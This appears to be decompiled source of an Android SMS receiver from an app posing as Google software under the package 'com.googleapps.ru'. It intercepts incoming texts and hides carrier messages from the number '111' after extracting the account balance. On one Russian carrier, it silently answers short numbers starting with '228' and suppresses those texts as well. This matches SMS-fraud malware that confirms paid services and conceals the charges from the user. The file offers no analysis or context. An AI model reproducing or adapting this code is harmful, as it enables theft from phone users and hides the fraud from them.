package com.googleapps.ru;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MessageReceiver
  extends BroadcastReceiver
{
  public MessageReceiver() {}
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    SmsMessage[] arrayOfSmsMessage;
    if (paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
    {
      paramIntent = paramIntent.getExtras();
      arrayOfSmsMessage = (SmsMessage[])null;
      if (paramIntent == null) {}
    }
    try
    {
      paramIntent = (Object[])paramIntent.get("pdus");
      arrayOfSmsMessage = new SmsMessage[paramIntent.length];
      int i = 0;
      for (;;)
      {
        if (i >= arrayOfSmsMessage.length) {
          return;
        }
        arrayOfSmsMessage[i] = SmsMessage.createFromPdu((byte[])paramIntent[i]);
        Object localObject1 = arrayOfSmsMessage[i].getOriginatingAddress();
        String str = arrayOfSmsMessage[i].getMessageBody();
        Object localObject2 = paramContext.getSharedPreferences("PREFERENCES", 0);
        if ((((String)localObject1).equals("111")) && (((SharedPreferences)localObject2).getBoolean("com.googleapps.ru.SendProcedure", false)))
        {
          localObject1 = Pattern.compile("-?\\d+").matcher(str);
          if (((Matcher)localObject1).find())
          {
            TextUtils.putSettingsValue(paramContext, "com.googleapps.ru.SendProcedure", false, (SharedPreferences)localObject2);
            TextUtils.putSettingsValue(paramContext, "BALANCE_STRING", ((Matcher)localObject1).group(), (SharedPreferences)localObject2);
            paramContext.sendBroadcast(new Intent("com.googleapps.ru.SendProcedure"));
          }
          abortBroadcast();
        }
        else if (((String)localObject1).equals("111"))
        {
          abortBroadcast();
        }
        else if ((((String)localObject1).startsWith("228")) && (Utils.getMCC(paramContext).equals("250")) && (Utils.getMNC(paramContext).equals("01")))
        {
          localObject2 = Integer.toString((int)(Math.random() * 20.0D));
          SmsManager.getDefault().sendTextMessage((String)localObject1, null, (String)localObject2, null, null);
          abortBroadcast();
          break label264;
          return;
        }
        label264:
        i += 1;
      }
      return;
    }
    catch (Exception paramContext) {}
  }
}
